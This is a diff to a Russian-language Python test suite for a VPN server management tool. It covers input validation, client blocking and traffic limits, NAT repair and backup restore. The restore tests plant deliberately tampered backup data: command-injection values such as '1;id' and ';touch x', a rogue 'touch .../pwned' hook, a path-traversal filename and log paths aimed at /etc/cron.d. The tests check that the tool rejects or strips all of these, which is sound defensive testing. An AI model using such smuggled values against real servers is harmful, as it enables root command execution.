@@ -19,6 +19,7 @@ test_toolza.py — проверка собранного awg2 (dist/awg2.sh) б�
 Запуск:  python3 tests/test_toolza.py [путь/к/dist/awg2.sh]
 Выход:   0 — всё прошло, 1 — есть провалы.
 """
+import base64
 import os
 import sys
 import time
@@ -207,6 +208,14 @@ rc, out, err = bash('valid_port 0080 || echo a; valid_port 65536 || echo b; vali
                     'valid_port 80 && valid_port 65535 && valid_cidr 10.0.0.0/0 && valid_cidr 10.8.0.0/24 && echo f')
 chk("valid_port/valid_cidr: ведущие нули — отказ без ошибки bash", out.split() == ["a", "b", "c", "d", "e", "f"]
     and "too great" not in err and "syntax error" not in err, out + err)
+# Октеты IP без ведущих нулей: «010.0.0.1» iptables отвергает, а ip_is_private
+# счёл бы его публичным
+rc, out, err = bash('valid_ip 010.0.0.1 || echo a; valid_ip 1.2.3.04 || echo b; valid_ip 256.1.1.1 || echo c; '
+                    'valid_ip 0.0.0.0 && valid_ip 10.0.0.1 && valid_ip 255.255.255.255 && echo d; '
+                    'valid_cidr 010.8.0.0/24 || echo e')
+chk("valid_ip: октеты с ведущими нулями — отказ", out.split() == ["a", "b", "c", "d", "e"] and not err, out + err)
+rc, out, _ = bash('for d in 010.0.0.1 1.2.3.04 1.2.3.4 example.com; do valid_domain "$d" && echo "$d"; done')
+chk("valid_domain: цифры с точками (и с нулями) — не домен", out.split() == ["example.com"], out)
 
 WG = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
 os.makedirs(os.path.dirname(WG), exist_ok=True)
@@ -332,6 +341,20 @@ for k, link in LINKS_OK.items():
 rc, out, err = bash("py xray-link 'vless://0378c8eb-6544-478e-837d-c3599ef8e73d@v.example.site:443?security=tls&type=tcp&allowInsecure=1#v'")
 chk("allowInsecure не попадает в конфиг (Xray 26 его отвергает), с пояснением",
     rc == 0 and "allowInsecure" not in out and "pinSHA256" in err, [out, err])
+rc, out, _ = bash("py xray-link 'trojan://p:a@t.example.com:443?security=tls#t'")
+chk("trojan: пароль с двоеточием целиком", rc == 0 and json.loads(out)["settings"]["servers"][0]["password"] == "p:a", out)
+for k, link in {"vless :0": "vless://0378c8eb-6544-478e-837d-c3599ef8e73d@v.example.site:0?security=tls",
+                "hy2 :0": "hy2://pw@h.example.com:0", "ss :99999": "ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:99999",
+                "ss не-ASCII порт": "ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:\u0664\u0664\u0663",
+                "vmess порт abc": "vmess://" + base64.b64encode(b'{"add":"v.example.com","port":"abc","id":"x"}').decode(),
+                "hy2 salamander без пароля": "hy2://pw@h.example.com:443?obfs=salamander"}.items():
+    rc, out, err = bash(f"py xray-link '{link}'")
+    chk(f"ссылка {k} — отказ без трассировки", rc != 0 and "Traceback" not in err and not out.strip(), [out, err])
+rc, out, _ = bash("py xray-link 'ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:000443'; py xray-link 'vmess://" +
+                  base64.b64encode(b'{"add":"v.example.com","port":443.0,"id":"x"}').decode() + "'")
+ports = [json.loads(ln).get("settings", {}) for ln in out.strip().splitlines() if ln.startswith("{")]
+chk("порт с ведущими нулями и vmess-порт 443.0 — принимаются как 443",
+    rc == 0 and [p.get("servers", p.get("vnext", [{}]))[0].get("port") for p in ports] == [443, 443], out)
 rc, out, err = bash("py xray-link 'hy2://pw@h.example.com:443?obfs=salamander&obfs-password=s3#x'")
 chk("Hysteria2 с salamander — finalmask", rc == 0 and json.loads(out)["streamSettings"]["finalmask"]
     == {"udp": [{"type": "salamander", "settings": {"password": "s3"}}]}, [out, err])
@@ -368,6 +391,54 @@ rc, out, _ = bash(XRAY_ENV + f"xray_del_tag {XT[1]} >/dev/null; cat \"$XRAY_PEER
 chk("удалён выход — его клиенты на выходе по умолчанию", IP1 in out.split() and "|" not in out, out)
 with open(XP, "w") as f:
     f.write(xp_saved)
+# Свой выход живёт и в конфиге Xray: выкл/вкл клиента без пересборки оставлял
+# правило по адресу — клиент шёл через прежний выход, а в списке — «по умолчанию»
+rc, out, _ = bash(XRAY_ENV + 'xray_is_up() { true; }; xray_restart() { echo RESTART; }; _tunnel_rules_refresh() { :; }; '
+                  f'tunnel_client xray {C1} off; tunnel_client xray {C1} on; cat "$XRAY_PEERS"; '
+                  'python3 -c "import json,sys; print(json.dumps(json.load(open(sys.argv[1]))[\'routing\'][\'rules\']))" "$XRAY_CONF"')
+rules = json.loads(out.strip().splitlines()[-1]) if out.strip() else []
+chk("Xray: выкл/вкл клиента со своим выходом — конфиг пересобран, правило по адресу снято",
+    out.count("RESTART") == 1 and IP1 in out.split() and f"{IP1}|" not in out
+    and not any(IP1 in (r.get("source") or []) for r in rules), out)
+with open(XP, "w") as f:
+    f.write("10.0.0.5|t.1\n10.0.0.6|tx1\n10.0.0.7\n10.0.0.8|t2\n")
+rc, out, _ = bash(XRAY_ENV + '_xray_peers_untag t.1 t2; cat "$XRAY_PEERS"')
+chk("выходы удалены (в т.ч. «Починить конфиг») — их клиенты на выходе по умолчанию, тег не как регулярка",
+    out.split() == ["2", "10.0.0.5", "10.0.0.6|tx1", "10.0.0.7", "10.0.0.8"], out)
+with open(XP, "w") as f:
+    f.write(xp_saved)
+# Заблокированный клиент остаётся в списках туннелей под своим адресом
+WP = os.path.join(ROOT, "warp.peers.test")
+with open(WP, "w") as f:
+    f.write(IP2 + "\n")
+rc, out, _ = bash(f'py meta-set "$SERVER_CONF" {C2} expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
+                  f'peers_sync "{WP}"; cat "{WP}"; clients_name_ip | grep "^{C2}|"; py expire-clear "$SERVER_CONF" {C2} "$EXPIRE_SUSPEND_IP" >/dev/null')
+chk("заблокированный клиент: в списке туннеля и в clients_name_ip — настоящий адрес", out.split() == [IP2, f"{C2}|{IP2}"], out)
+os.remove(WP)
+# Удаление заблокированного клиента: его настоящий адрес уходит из туннелей
+bash('client_create gina "" none "1.1.1.1, 1.0.0.1" "" >/dev/null 2>&1')
+rc, out, _ = bash('had=0; [[ -f "$WARP_PEERS" ]] && had=1 && cp "$WARP_PEERS" "$WARP_PEERS.sv"; '
+                  'ip=$(clients_name_ip | awk -F"|" \'$1 == "gina" {print $2}\'); echo "$ip" >> "$WARP_PEERS"; '
+                  'py meta-set "$SERVER_CONF" gina expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
+                  'client_delete "$(client_pub gina)" >/dev/null 2>&1; echo "ip=$ip"; grep -c "^$ip\(|\|$\)" "$WARP_PEERS" || true; '
+                  'if (( had )); then mv -f "$WARP_PEERS.sv" "$WARP_PEERS"; else rm -f "$WARP_PEERS"; fi')
+gip = re.search(r"ip=(\S+)", out)
+chk("удалён заблокированный клиент — его настоящий адрес убран из списка туннеля",
+    gip and gip.group(1).startswith("10.") and out.strip().splitlines()[-1] == "0", out)
+# Чужой тег входа tun («tun» из правленного руками конфига): общее правило
+# переставало узнаваться — дописывалось новое, старое вело в прежний выход
+XF = os.path.join(TMP, "xf.json")
+with open(XF, "w") as f:
+    json.dump({"inbounds": [{"protocol": "tun", "tag": "tun", "settings": {}}],
+               "outbounds": [{"protocol": "vless", "tag": "A"}, {"protocol": "vless", "tag": "B"},
+                             {"protocol": "freedom", "tag": "direct"}],
+               "routing": {"rules": [{"type": "field", "inboundTag": ["tun"], "outboundTag": "A"}]}}, f)
+rc, out, _ = bash(f'py xray-prepare "{XF}" native && py xray-main "{XF}" B && py xray-prepare "{XF}" native && py xray-main-get "{XF}"')
+xf = json.load(open(XF))
+mains = [r for r in xf["routing"]["rules"] if r.get("inboundTag")]
+chk("Xray: чужой тег tun — одно общее правило, выход по умолчанию меняется",
+    rc == 0 and out.strip() == "B" and len(mains) == 1 and mains[0] == {"type": "field", "inboundTag": ["tun-in"], "outboundTag": "B"}
+    and xf["inbounds"][0]["tag"] == "tun-in", [out, xf])
 bash("client_remove xc1 >/dev/null 2>&1")
 
 # ── 4. Служебные скрипты ──────────────────────────────────
@@ -586,6 +657,41 @@ r = api("exits", "mode", "all")
 chk("exits mode all — режим меняется", r.get("ok") and "mode=all" in open(EX_STATE).read(), r)
 r = api("exits", "mode", "x")
 chk("exits mode — только all|peers", r.get("ok") is False, r)
+# «никто» → «все» → «alice напрямую»: список был пуст, и мимо нод уходили все
+api("exits", "client", "none")
+api("exits", "mode", "all")
+r = api("exits", "client", "alice", "off")
+chk("из «все клиенты» в «выбранные»: напрямую только alice, остальные через ноды",
+    r.get("ok") and sorted(peers()) == sorted(ip for n, ip in ips.items() if n != "alice") and "mode=peers" in open(EX_STATE).read(),
+    [r, peers()])
+# Клиент «all»: «exits client all off» — про него, а не про всех
+api("client", "add", "all", "mimicry=none")
+api("exits", "client", "all")
+ip_all = next(c["ip"] for c in api("clients", "list").get("data") or [] if c["name"] == "all")
+r = api("exits", "client", "all", "off")
+chk("клиент по имени all: со вторым аргументом — только он", r.get("ok") and ip_all not in peers() and len(peers()) == len(ips), [r, peers()])
+# Туннели: то же — «tunnels client xray all off» про клиента «all»
+api("tunnels", "client", "warp", "all")
+r = api("tunnels", "client", "warp", "all", "off")
+wl = api("tunnels", "clients", "warp").get("data") or []
+chk("туннель: клиент по имени all с off — выключен только он",
+    r.get("ok") and [c["name"] for c in wl if not c["on"]] == ["all"], [r, wl])
+r = api("tunnels", "client", "warp", "none")
+wl = api("tunnels", "clients", "warp").get("data") or []
+chk("туннель: none без аргумента — все напрямую", r.get("ok") and not any(c["on"] for c in wl), wl)
+api("client", "del", "all")
+# Кнопка «выбранные» после «никто» и «все»: пустой список увёл бы мимо нод всех
+api("exits", "client", "none")
+api("exits", "mode", "all")
+r = api("exits", "mode", "peers")
+chk("exits mode peers после «никто» и «все» — через ноды все, а не никто",
+    r.get("ok") and len(peers()) == len(ips), [r, peers()])
+# …а сознательный выбор переживает «все» → «выбранные»
+api("exits", "client", "none")
+api("exits", "client", "bob", "shared")
+api("exits", "mode", "all")
+api("exits", "mode", "peers")
+chk("exits mode peers возвращает прежний выбор", peers() == [ips["bob"]], peers())
 with open(EX_PEERS, "w") as f:
     f.write(saved[0])
 with open(EX_STATE, "w") as f:
@@ -678,7 +784,8 @@ r = api("client", "limit", "alice", "5G", "week")
 chk("лимит: неизвестный период", r.get("ok") is False, r)
 r = api("client", "limit-reset", "bob")
 chk("обнулить без лимита — ошибка", r.get("ok") is False, r)
-# Истёк и срок: блок переходит к сроку, снятие лимита его не снимает
+# Истёк и срок: пока лимит исчерпан, блок держит он; отпустил лимит — блок
+# переходит к сроку, и снимается уже сроком
 api("client", "limit", "alice", "1K")
 dump_with({"alice": (100 + 2**20 + 4096, 100), "bob": (10, 10)})
 tick()
@@ -686,11 +793,94 @@ chk("превысил лимит по ходу — блок таймером", c
 bash('py meta-set "$SERVER_CONF" alice expires 1')
 tick()
 a = cl("alice")
-chk("истёк срок у заблокированного за трафик — блок держит срок", a.get("blocked") and a.get("blocked_by") == "expire", a)
+chk("истёк срок у заблокированного за трафик — блок держит лимит", a.get("blocked") and a.get("blocked_by") == "traffic", a)
+r = api("client", "unexpire", "alice")
+a = cl("alice")
+chk("снять срок не снимает блок за трафик", r.get("ok") and a.get("blocked") and a.get("blocked_by") == "traffic"
+    and a.get("expires") is None and "лимит трафика" in r.get("log", ""), [r, a])
+rc, out, _ = bash('client_expire_set alice $(( $(date +%s) + 86400 )) >/dev/null; clients_tsv | grep "^alice"')
+chk("новый срок после истёкшего блок за трафик не снимает", "\t127.0.0.2/32\t" in out, repr(out))
+bash('py meta-set "$SERVER_CONF" alice expires 1')
+# «Истёкшие» удаляют только заблокированных сроком
+api("client", "add", "erin", "mimicry=none")
+bash('py meta-set "$SERVER_CONF" erin expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null')
+# bob (истёк в начале раздела) нужен дальше — снимаем с него срок, чтобы purge его не тронул
+bash('py expire-clear "$SERVER_CONF" bob "$EXPIRE_SUSPEND_IP" >/dev/null')
+r = api("clients", "purge-blocked")
+names = [c["name"] for c in api("clients", "list").get("data") or []]
+chk("purge-blocked: истёкший удалён, заблокированный за трафик остался", r.get("ok") and "erin" not in names
+    and "alice" in names, [r, names])
 api("client", "limit", "alice", "off")
-chk("снятие лимита не снимает блок за срок", cl("alice").get("blocked") and cl("alice").get("limit") is None, cl("alice"))
+a = cl("alice")
+chk("снятие лимита у истёкшего — блок переходит к сроку", a.get("blocked") and a.get("blocked_by") == "expire"
+    and a.get("limit") is None, a)
 api("client", "unexpire", "alice")
 chk("снять срок — разблокировка", not cl("alice").get("blocked"), cl("alice"))
+# Лимит по новой базе (база потеряна): трафик до этой минуты в лимит не идёт
+bash('rm -f "$TRAFFIC_DB"')
+dump_with({"alice": (50 * 2**20, 50 * 2**20)})
+r = api("client", "limit", "alice", "10M")
+a = cl("alice")
+chk("лимит по новой базе: накопленное до учёта не считается", r.get("ok") and not a.get("blocked")
+    and a.get("used") == 0, [r, a])
+dump_with({"alice": (50 * 2**20 + 1000, 50 * 2**20)})
+tick()
+chk("лимит по новой базе: дальше — только прирост", cl("alice").get("used") == 1000, cl("alice"))
+api("client", "limit", "alice", "off")
+# Пустой снимок (awg0 лежит) не снимает «первый проход»
+bash('rm -f "$TRAFFIC_DB"')
+dump_with({})
+tick()
+dump_with({"alice": (7 * 2**20, 7 * 2**20)})
+tick()
+chk("пустой снимок: накопленное до учёта не идёт в сегодня", cl("alice").get("today") == 0, cl("alice"))
+rc, out, _ = bash('ls "$EXPIRE_STATE_DIR" | grep "^transfer"')
+chk("снимки счётчиков не остаются — только последний, для сторожа таймера", out.split() == ["transfer"], out)
+# Размер лимита: «500B» — не 500 ГБ; переполнение и не-ASCII цифры — ошибка
+rc, out, _ = bash('for v in 500B 500iB 2000000T 9999999T "١٢G" 0.0001K; do py size-parse "$v" >/dev/null 2>&1 && echo "$v"; done; '
+                  'for v in 500MB 1.5T 50 2GiB 1024T; do py size-parse "$v" >/dev/null 2>&1 || echo "!$v"; done')
+chk("размер лимита: B без единицы, > 1 ПБ, не-ASCII — отказ", out.strip() == "", repr(out))
+# traffic daily: имя клиента из цифр — это имя, а не число дней
+api("client", "add", "2024", "mimicry=none")
+r = api("traffic", "daily", "2024", "7")
+chk("api traffic daily ИМЯ-ЧИСЛО ДНЕЙ", r.get("ok") and r["data"]["name"] == "2024" and len(r["data"]["days"]) == 7
+    and "clients" not in r["data"], r)
+r = api("traffic", "daily", "all", "7")
+chk("api traffic daily all ДНЕЙ — сервер", r.get("ok") and r["data"]["name"] == "" and len(r["data"]["days"]) == 7, r)
+r = api("traffic", "daily", "14")
+chk("api traffic daily ДНЕЙ — сервер", r.get("ok") and r["data"]["name"] == "" and len(r["data"]["days"]) == 14, r)
+api("client", "del", "2024")
+# Таймер ждёт замок API: конфиг не правится одновременно с вызовом из бота
+api("client", "add", "frank", "mimicry=none")
+rc, out, _ = bash('mkdir -p "$STATE_DIR"; exec 7>>"$STATE_DIR/api.lock"; flock 7; '
+                  'py meta-set "$SERVER_CONF" frank expires 1; touch -d "-10 min" "$EXPIRE_STATE_DIR/transfer"; '
+                  '( exec 7>&-; EXPIRE_LOCK_WAIT=1 expire_check_run ); clients_tsv | grep "^frank"; '
+                  'echo "age=$(( $(date +%s) - $(stat -c %Y "$EXPIRE_STATE_DIR/transfer") ))"')
+chk("таймер: замок API занят — проход пропущен, но сторож видит, что таймер жив",
+    "\t127.0.0.2/32\t" not in out and int(re.search(r"age=(-?\d+)", out).group(1)) < 60, repr(out))
+# Долгая задача API: замок занят дольше EXPIRE_LOCK_MAX — проход идёт без него
+rc, out, _ = bash('exec 7>>"$STATE_DIR/api.lock"; flock 7; touch -d "-5 min" "$EXPIRE_STATE_DIR/lock_busy"; '
+                  '( exec 7>&-; EXPIRE_LOCK_WAIT=1 expire_check_run ); clients_tsv | grep "^frank"; '
+                  '[[ -f "$EXPIRE_STATE_DIR/lock_busy" ]] && echo BUSY-MARK')
+chk("таймер: замок занят дольше 2 минут — сроки не ждут, проход идёт", "\t127.0.0.2/32\t" in out, repr(out))
+bash('py expire-clear "$SERVER_CONF" frank "$EXPIRE_SUSPEND_IP" >/dev/null; rm -f "$EXPIRE_STATE_DIR/lock_busy"; '
+     'py meta-set "$SERVER_CONF" frank expires 1')
+# Сообщения в Telegram — после замка: иначе медленный Telegram держал бы замок API
+with open(os.path.join(ROOT, "bot.conf"), "w") as f:
+    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11, 22\n')
+SENT = os.path.join(TMP, "notify-lock")
+rc, out, _ = bash(f'curl() {{ cat >/dev/null; flock -n "$STATE_DIR/api.lock" true && echo FREE >> "{SENT}" || echo HELD >> "{SENT}"; }}; '
+                  'expire_check_run; clients_tsv | grep "^frank"')
+sent = open(SENT).read().split() if os.path.exists(SENT) else []
+# Telegram не отвечает: рассылка не дольше бюджета, остаток — в журнале
+bash('py expire-clear "$SERVER_CONF" frank "$EXPIRE_SUSPEND_IP" >/dev/null; py meta-set "$SERVER_CONF" frank expires 1')
+rc, out2, _ = bash(f'curl() {{ cat >/dev/null; echo X >> "{SENT}.2"; }}; EXPIRE_NOTIFY_BUDGET=0 expire_check_run; tail -1 "$EXPIRE_LOG"')
+os.remove(os.path.join(ROOT, "bot.conf"))
+chk("уведомления: бюджет времени исчерпан — дальше не шлём, в журнале сколько не ушло",
+    not os.path.exists(SENT + ".2") and "не отправлено 1" in out2, out2)
+chk("таймер: замок свободен — проход идёт; сообщения админам — уже без замка API",
+    "\t127.0.0.2/32\t" in out and sent and set(sent) == {"FREE"}, [repr(out), sent])
+api("client", "del", "frank")
 rc, out, _ = bash("traffic_tick; cat $EXPIRE_LOG | tail -3")
 # Блок за трафик делает скрипт таймера на диске, а не awg2: тот же сценарий через него
 api("client", "limit", "alice", "1M", "total")
@@ -887,6 +1077,11 @@ chk("автобэкап: архив без каталога, старые авт
     r.get("ok") and r["data"]["path"].endswith("_auto.tar.gz") and len(autos) == 2
     and autos[0] == "awg2_backup_20200103_000000_auto.tar.gz" and os.path.basename(r["data"]["path"]) == autos[1]
     and not os.path.isdir(r["data"]["path"][:-7]) and os.path.exists(bk_path), [r, autos])
+rc, out, _ = bash('tar() { if [[ "$1" == -czf && "$2" == *_auto.tar.gz ]]; then echo partial > "$2"; return 1; fi; command tar "$@"; }; '
+                  'backup_create archive auto 2 2>&1; echo "rc=$?"')
+after = sorted(f for f in os.listdir(BKD) if "_auto" in f)
+chk("автобэкап: архив не записался — ошибка, ни обрезка, ни каталога с ключами, целые не тронуты",
+    "rc=1" in out and "Архив бэкапа не записан" in out and after == autos, [out[-300:], after])
 for f in autos:
     os.remove(os.path.join(BKD, f))
 r = api("backup", "inspect", bk_path)
@@ -950,8 +1145,43 @@ chk("восстановление бэкапа с eth0 на сервер с ens3
 rc, out, _ = bash("AUTO_MODE=1; do_repair 2>&1")
 now_conf = open(conf).read()
 chk("«Проверить и починить» возвращает NAT на настоящий аплинк навсегда — в awg0.conf",
-    "ens3, а выход сервера — eth0" in out and "NAT перенесён на eth0" in out
+    "на ens3, такого интерфейса нет; выход сервера — eth0" in out and "NAT перенесён на eth0" in out
     and "-o eth0 -j MASQUERADE" in now_conf and "-o ens3" not in now_conf, out[-800:])
+# Интерфейс из awg0.conf на этом сервере есть — NAT через него выбран
+# сознательно: не переписывается и не перебивается правилом на аплинк
+open(conf, "w").write(eth0_conf.replace("-o eth0 ", "-o tun9 "))
+links_saved = open(LINKS).read()
+with open(LINKS, "a") as f:
+    f.write("tun9\n")
+open(CALLS, "w").close()
+rc, out, _ = bash('conf_uplink_sync; echo "rc=$?"; AUTO_MODE=1; do_repair 2>&1')
+now_conf = open(conf).read()
+chk("NAT на существующем интерфейсе — оставлен, проверяется на нём же",
+    "rc=1" in out and "оставляю как настроено" in out and "-o tun9 -j MASQUERADE" in now_conf
+    and "-o eth0 -j MASQUERADE" not in open(CALLS).read(), [out[-800:], open(CALLS).read()[-600:]])
+open(LINKS, "w").write(links_saved)
+BK_TUN9 = os.path.join(TMP, "bk_tun9")
+os.makedirs(BK_TUN9, exist_ok=True)
+with open(os.path.join(BK_TUN9, "awg0.conf"), "w") as f:
+    f.write(eth0_conf.replace("-o eth0 ", "-o tun9 "))
+with open(LINKS, "a") as f:
+    f.write("tun9\n")
+rc, out, _ = bash(f"AUTO_MODE=1; uplink_iface() {{ echo eth0; }}; backup_restore '{BK_TUN9}' 2>&1")
+chk("восстановление бэкапа: NAT на аплинк этого сервера, даже если интерфейс со старым именем здесь есть",
+    "tun9 → eth0" in out and "-o eth0 -j MASQUERADE" in open(conf).read(), out[-500:])
+open(LINKS, "w").write(links_saved)
+# awg0 поднят: опускается до правки (PostDown старого конфига снимает старое
+# правило NAT) и поднимается снова
+open(conf, "w").write(eth0_conf)
+with open(LINKS, "a") as f:
+    f.write("awg0\n")
+open(CALLS, "w").close()
+rc, out, _ = bash('uplink_iface() { echo ens3; }; conf_uplink_sync >/dev/null; echo "rc=$?"')
+cl_ = [ln for ln in open(CALLS).read().splitlines() if ln.startswith("awg-quick")]
+chk("смена аплинка на поднятом awg0: down до правки, потом up",
+    "rc=0" in out and len(cl_) == 2 and cl_[0].startswith("awg-quick down") and cl_[1].startswith("awg-quick up")
+    and "-o ens3 -j MASQUERADE" in open(conf).read(), [out, cl_])
+open(LINKS, "w").write(links_saved)
 open(conf, "w").write(orig_conf)
 
 # Хуки awg-quick выполняются от root. Свои команды Тулзы (1.x и 0.8) проходят,
@@ -989,6 +1219,16 @@ fw = fw.strip()
 chk("wgobf0 из бэкапа: хуки — ровно скрипт Тулзы, о чужих — предупреждение",
     conf_text.strip() == f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1"
     and "чужие команды" in said and "touch /tmp/x" in said and "/old/fw.sh down" in said, out)
+with open(WGC, "w") as f:
+    f.write(" [interface]\r\nPrivateKey = X\r\nPostUp = touch /tmp/x\r\nListenPort = 1\r\n")
+rc, out, _ = bash('_wgobf_hooks_reset >/dev/null 2>&1; echo "rc=$?"; cat "$WGOBF_WG_CONF"')
+chk("wgobf0 из бэкапа: « [interface]» и CRLF — заголовок приведён, хуки Тулзы на месте",
+    out.startswith("rc=0\n") and f"[Interface]\nPostUp = {fw} up\nPostDown = {fw} down\nPrivateKey = X\nListenPort = 1" in out
+    and b"\r" not in open(WGC, "rb").read(), repr(out))   # вывод bash() — text=True, \r\n там уже \n
+with open(WGC, "w") as f:
+    f.write("PrivateKey = X\n")
+rc, out, _ = bash('_wgobf_hooks_reset >/dev/null 2>&1; echo "rc=$?"')
+chk("wgobf0 из бэкапа без секции [Interface] — ошибка, а не обфускатор без файрвола", out.strip() == "rc=1", out)
 
 # Подделанный бэкап: в awg0.conf — команды не из Тулзы, в архиве туннелей —
 # файл вне путей Тулзы, exit-нода с хуком, мусор в каскаде и tun2socks,
@@ -1019,7 +1259,17 @@ members = {
                                             f"PostUp = touch {TMP}/pwned\n\n[Peer]\nPublicKey = P\n"
                                             "Endpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n",
     os.path.join(AWGD, "awg-exit-../x.conf"): "[Interface]\n",
-    os.path.join(ROOT, "etc/awg-cascade/rules.conf"): "udp|4443|5.6.7.8|443|ok\nudp|1;id|5.6.7.8|443|bad\n",
+    os.path.join(ROOT, "etc/awg-cascade/rules.conf"): "udp|4443|5.6.7.8|443|ok\nudp|1;id|5.6.7.8|443|bad\n"
+        "tcp|8080|10.0.0.5|80|private\nudp|4444|010.0.0.1|443|zeros\ntcp|99999|5.6.7.8|443|port\n"
+        "udp|51820|5.6.7.8|443|awgport\nudp|4443|5.6.7.9|443|dup\n",
+    os.path.join(ROOT, "etc/xray/config.json"): json.dumps({
+        "log": {"access": "/etc/cron.d/x"}, "api": {"tag": "api", "services": ["HandlerService"]},
+        "inbounds": [{"tag": "socks-in", "protocol": "socks", "listen": "0.0.0.0", "port": 10808},
+                     {"tag": "open", "protocol": "socks", "listen": "0.0.0.0", "port": 1080},
+                     {"tag": "api-in", "protocol": "dokodemo-door", "listen": "0.0.0.0", "port": 10085}],
+        "outbounds": [{"tag": "proxy_a", "protocol": "vless", "settings": {}}, {"tag": "direct", "protocol": "freedom"}],
+        "routing": {"rules": [{"inboundTag": ["api-in"], "outboundTag": "api"},
+                              {"inboundTag": ["socks-in"], "outboundTag": "proxy_a"}]}}),
     os.path.join(ROOT, "etc/tun2socks/proxy.txt"): "127.0.0.1:1080;touch x\n",
     os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml"):
         "server_names = ['quad9-doh-ip4-port443-nofilter-pri']\n[query_log]\n  file = '/etc/cron.d/x'\n",
@@ -1049,7 +1299,37 @@ chk("exit-нода из бэкапа — без хуков, с Table = off", "Po
     and not os.path.exists(os.path.join(AWGD, "x.conf")), ex2)
 with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf")) as f:
     rules = f.read()
-chk("каскад из бэкапа — только строки по формату", rules == "udp|4443|5.6.7.8|443|ok\n", rules)
+chk("каскад из бэкапа — только с проверками добавления: публичная цель, порты, вход не занят, без дублей",
+    rules == "udp|4443|5.6.7.8|443|ok\n" and "10.0.0.5" in log and "010.0.0.1" in log and "51820" in log, [rules, log[-900:]])
+CRF, CRO = os.path.join(TMP, "cr-in"), os.path.join(TMP, "cr-out")
+with open(CRF, "w", newline="") as f:
+    f.write("udp|4443|5.6.7.8|443|a\r\nudp|4445|5.6.7.9|443\r\ntcp|4446|5.6.7.9|443|last")
+rc, out, _ = bash(f'CASCADE_RULES="{CRO}"; write_file() {{ cat > "$1"; }}; _restore_cascade_rules "{CRF}" 2>&1; cat "{CRO}"')
+chk("каскад из бэкапа: CRLF и последняя строка без перевода строки — не теряются",
+    out.strip().splitlines()[-3:] == ["udp|4443|5.6.7.8|443|a", "udp|4445|5.6.7.9|443|", "tcp|4446|5.6.7.9|443|last"], out)
+with open(os.path.join(ROOT, "etc/xray/config.json")) as f:
+    xr = json.load(f)
+chk("Xray из бэкапа: выходы и маршруты — да, чужие входы, API и журнал — нет",
+    [o["tag"] for o in xr["outbounds"]] == ["proxy_a", "direct"] and xr["inbounds"] == []
+    and "api" not in xr and "log" not in xr
+    and xr["routing"]["rules"] == [{"inboundTag": ["socks-in"], "outboundTag": "proxy_a"}]
+    and "Из конфига Xray бэкапа убрано" in log and "api-in" in log, [xr, log[-600:]])
+# Чужой тег своего входа tun и кривые записи: главное правило не теряется
+XRC = os.path.join(TMP, "xrc.json")
+with open(XRC, "w") as f:
+    json.dump({"inbounds": [{"protocol": "tun", "tag": "tun"}, {"protocol": "socks", "tag": "evil\u001b[2J"}, "x", ["y"],
+                            {"protocol": "socks", "tag": ["list"]}],
+               "outbounds": [{"protocol": "vless", "tag": "a"}, {"protocol": "vless", "tag": "b"},
+                             {"protocol": "freedom", "tag": "direct"}, {"protocol": "vless", "tag": ["z"]}],
+               "routing": {"balancers": "oops", "rules": [
+                   {"inboundTag": ["tun"], "outboundTag": "b"}, {"inboundTag": [["x"]], "outboundTag": "a"},
+                   {"outboundTag": ["a"]}, "junk"]}}, f)
+rc, out, err = bash(f'py xray-restore-clean "{XRC}" && py xray-prepare "{XRC}" native && py xray-main-get "{XRC}"')
+xc = json.load(open(XRC))
+chk("Xray из бэкапа: правило своего tun с чужим тегом сохраняется (выход b), кривые записи — убраны без падения",
+    rc == 0 and out.strip().splitlines()[-1] == "b" and "\x1b" not in out and "Traceback" not in err
+    and [r for r in xc["routing"]["rules"] if r.get("inboundTag")] == [{"inboundTag": ["tun-in"], "outboundTag": "b"}],
+    [out, err[-300:], xc["routing"]])
 chk("адрес tun2socks не по формату не восстановлен", not os.path.exists(os.path.join(ROOT, "etc/tun2socks/proxy.txt")))
 with open(os.path.join(ROOT, "etc/dnscrypt-proxy/dnscrypt-proxy.toml")) as f:
     toml = f.read()
@@ -1195,6 +1475,13 @@ rc, out, _ = bash(KG + 'mod_built_for() { true; }; kernel_gap; echo "[$(kernel_g
 chk("модуль собран под все ядра — пусто", out == "[]\n", out)
 rc, out, _ = bash(KG + 'mod_built_for() { [[ $1 == 6.8.0-100-generic ]]; }; components_summary')
 chk("шапка меню предупреждает о ядре без модуля", "6.8.0-110-generic" in out and "Пересобрать" in out, out)
+rc, out, _ = bash(KG + 'mod_built_for() { false; }; mod_loaded() { false; }; components_summary')
+chk("шапка: и работающее ядро без модуля не прячет более новое", "ядро 6.8.0-110-generic" in out
+    and "6.8.0-100-generic," not in out, out)
+chk("шапка: …и про работающее ядро без модуля тоже сказано", "работающее ядро 6.8.0-100-generic" in out, out)
+rc, out, _ = bash(KG + 'uname() { echo 6.8.0-1; }; installed_kernels() { printf "%s\\n" 6.8.0-1 6.8.0-10; }; '
+                  'mod_built_for() { [[ $1 == 6.8.0-1 ]]; }; components_summary')
+chk("шапка: 6.8.0-10 без модуля при работающем 6.8.0-1 — не префикс", "ядро 6.8.0-10" in out, out)
 r = api("status")
 chk("api status: components.kernel_gap", r.get("ok") and "kernel_gap" in (r["data"].get("components") or {}), r.get("data"))
 chk("api status: uptime — секунды работы системы", isinstance(r["data"].get("uptime"), int) and r["data"]["uptime"] > 0, r.get("data"))
@@ -1226,66 +1513,90 @@ rc, out, _ = bash('echo "$VERSION_SHOW"')
 chk("версия без буквы у обычной сборки", out.strip() == bash('echo "$VERSION"')[1].strip(), out)
 
 print("Подпись обновлений")
-SIG = os.path.join(TMP, "sigsrv")
-SIGBIN = os.path.join(TMP, "sigbin")
-os.makedirs(SIG)
-os.makedirs(SIGBIN)
